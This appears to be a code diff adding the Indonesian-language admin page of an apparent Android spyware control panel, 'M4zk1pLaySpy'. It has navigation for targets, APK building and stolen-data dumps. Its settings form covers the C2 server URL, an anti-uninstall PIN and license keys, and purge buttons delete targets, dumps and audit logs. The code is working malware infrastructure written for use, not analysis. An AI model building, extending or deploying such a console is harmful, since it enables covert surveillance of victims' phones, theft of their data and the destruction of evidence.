@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Admin — M4zk1pLaySpy</title>
+<link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+<div class="shell">
+  <aside class="side">
+    <div class="brand"><img src="/static/img/garuda.svg" alt=""><div><b>M4ZK1PL4Y</b><span>SPY CONSOLE</span></div></div>
+    <nav class="nav">
+      <a href="/dashboard">▣ <span class="lbl">DASHBOARD</span></a>
+      <a href="/targets">◈ <span class="lbl">TARGET</span></a>
+      <a href="/build">⚙ <span class="lbl">BUILD APK</span></a>
+      <a href="/dumps">⇩ <span class="lbl">HASIL DUMP</span></a>
+      <a href="/admin">☰ <span class="lbl">ADMIN</span></a>
+    </nav>
+    <div class="side-foot"><div id="clock">--:--:--</div><a href="#" id="logout" style="display:block;margin-top:10px;color:var(--red)">▸ KELUAR</a></div>
+  </aside>
+  <main class="main">
+    <header class="top"><h2 class="glitch" data-t="ADMIN">ADMIN</h2>
+      <div class="spacer"></div><span class="pill on"><i class="led on"></i>SUPERUSER</span></header>
+
+    <div class="content">
+      <div class="grid g4">
+        <div class="card stat red"><div class="k">TARGET</div><div class="v" id="k1">0</div></div>
+        <div class="card stat green"><div class="k">ONLINE</div><div class="v" id="k2">0</div></div>
+        <div class="card stat amber"><div class="k">DUMP</div><div class="v" id="k3">0</div></div>
+        <div class="card stat"><div class="k">BUILD</div><div class="v" id="k4">0</div></div>
+      </div>
+
+      <div class="grid g2">
+        <div class="card"><div class="card-h"><b>PENGATURAN</b></div><div class="card-b">
+          <div class="field"><label>KUNCI LISENSI</label><div class="row">
+            <input class="inp" id="license" style="flex:1;letter-spacing:.2em">
+            <button class="btn sm amber" id="rotLic">ROTASI</button></div></div>
+          <div class="field"><label>URL C2 PUBLIK</label><input class="inp" id="c2" style="letter-spacing:0"></div>
+          <div class="grid g2">
+            <div class="field"><label>PIN ANTI-UNINSTALL</label><input class="inp" id="pin" style="letter-spacing:.2em"></div>
+            <div class="field"><label>DURASI SESI (JAM)</label><input class="inp" id="sess" type="number" min="1" max="720"></div>
+          </div>
+          <div class="grid g2">
+            <div class="field"><label>EMAIL KONTAK</label><input class="inp" id="email" style="letter-spacing:0"></div>
+            <div class="field"><label>NAMA TIM</label><input class="inp" id="team" style="letter-spacing:0"></div>
+          </div>
+          <div class="row"><button class="btn" id="save">SIMPAN</button>
+            <button class="btn sm ghost" id="rotSec">ROTASI SECRET</button></div>
+        </div></div>
+
+        <div class="card"><div class="card-h"><b>PEMBERSIHAN</b></div><div class="card-b">
+          <p style="font-size:11px;color:var(--dim);margin-bottom:12px">Tindakan permanen. Tidak bisa dibatalkan.</p>
+          <div class="row">
+            <button class="btn sm ghost" data-p="dumps">HAPUS DUMP</button>
+            <button class="btn sm ghost" data-p="builds">HAPUS BUILD</button>
+            <button class="btn sm ghost" data-p="targets">HAPUS TARGET</button>
+            <button class="btn sm ghost" data-p="audit">HAPUS AUDIT</button>
+            <button class="btn sm ghost" data-p="sessions">HAPUS SESI</button>
+          </div>
+          <div class="card-h" style="margin:18px -14px 0;border-top:1px solid var(--line);border-bottom:0">AUDIT LOG</div>
+          <div class="console" id="audit" style="margin-top:12px;height:200px"></div>
+        </div></div>
+      </div>
+    </div>
+  </main>
+</div>
+<div class="toast-wrap" id="tw"></div>
+
+<script type="module">
+import { $, $$, api, post, patch, toast, esc, fmt, clock, markNav } from '/static/js/core.js';
+markNav(); clock($('#clock'));
+$('#logout').onclick = async (e) => { e.preventDefault(); await post('/api/logout'); location.href = '/'; };
+
+async function load() {
+  const s = await api('/api/admin/settings');
+  const v = s.settings;
+  $('#license').value = v.license_key;
+  $('#c2').value = v.c2_public_url || '';
+  $('#pin').value = v.uninstall_pin;
+  $('#sess').value = v.session_hours;
+  $('#email').value = v.contact_email;
+  $('#team').value = v.contact_team;
+  const st = await api('/api/admin/stats');
+  $('#k1').textContent = st.targets; $('#k2').textContent = st.online;
+  $('#k3').textContent = st.dumps; $('#k4').textContent = st.builds;
+  const a = await api('/api/admin/audit');
+  $('#audit').innerHTML = a.audit.map((x) =>
+    `<div><span class="tm">${fmt.time(x.ts)}</span> <span class="wn">${esc(x.event)}</span> ${esc(x.detail)}</div>`).join('');
+}
+
+$('#save').onclick = async () => {
+  await patch('/api/admin/settings', {
+    license_key: $('#license').value.trim(),
+    c2_public_url: $('#c2').value.trim(),
+    uninstall_pin: $('#pin').value.trim(),
+    session_hours: Number($('#sess').value) || 24,
+    contact_email: $('#email').value.trim(),
+    contact_team: $('#team').value.trim(),
+  });
+  toast('Pengaturan disimpan.', 'ok');
+};
+$('#rotLic').onclick = async () => {
+  const r = await post('/api/admin/rotate-license');
+  $('#license').value = r.license; toast('Lisensi baru: ' + r.license, 'ok');
+};
+$('#rotSec').onclick = async () => { await post('/api/admin/rotate-secret'); toast('Secret dirotasi.', 'ok'); };
+$$('[data-p]').forEach((b) => {
+  b.onclick = async () => {
+    if (!confirm('Hapus ' + b.dataset.p + '?')) return;
+    await post('/api/admin/purge/' + b.dataset.p);
+    toast('Dibersihkan: ' + b.dataset.p, 'ok'); load();
+  };
+});
+load();
+</script>
+</body>
+</html>
